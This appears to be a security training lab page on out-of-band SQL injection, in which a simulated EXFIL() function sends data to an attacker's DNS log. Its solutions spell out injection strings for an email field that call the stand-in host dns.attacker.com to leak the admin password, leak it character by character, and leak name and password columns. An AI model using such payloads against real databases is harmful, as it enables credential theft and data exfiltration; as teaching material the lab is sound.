Out-of-Band Exfiltration

No data in the response. No true/false difference. No timing signal you can reliably measure. And yet the attacker still gets the password — because the database makes an outbound network call that carries the secret with it. This lab simulates that channel with an EXFIL() function writing to an attacker-side log.

EMAIL CHECK

Returns only "registered" or "not registered".

ATTACKER DNS LOG

Simulated view of the attacker's own server. Any EXFIL('host', value) call lands here. 


        


        

          
CHALLENGES

          

            01 — Leak the admin passwordUse EXFIL to send the password out through the DNS
              log.
          

          

            02 — Leak one character at a timePretend substr() is available and exfiltrate the
              password character by character.
          

          

            03 — Leak the whole users tableConcatenate several columns into a single exfil call.
          

          

            View solutions

            

              01 — Full password
              Any expression can be passed to EXFIL.
              
Email: x' AND EXFIL('dns.attacker.com', (SELECT password FROM users WHERE name='admin')) --

            


            

              02 — Character at a time
              Use SUBSTR() to leak in chunks. The engine supports
                substr(x, i, n).
              
Email: x' AND EXFIL('dns.attacker.com', substr((SELECT password FROM users WHERE name='admin'),1,1)) --

              

                Change the start index to walk the string. Each character lands
                in the log.
              

            


            

              03 — Whole users table
              Concatenate with || (or
                concat()).
              
Email: x' AND EXFIL('dns.attacker.com', (SELECT name || ':' || password FROM users LIMIT 1)) --
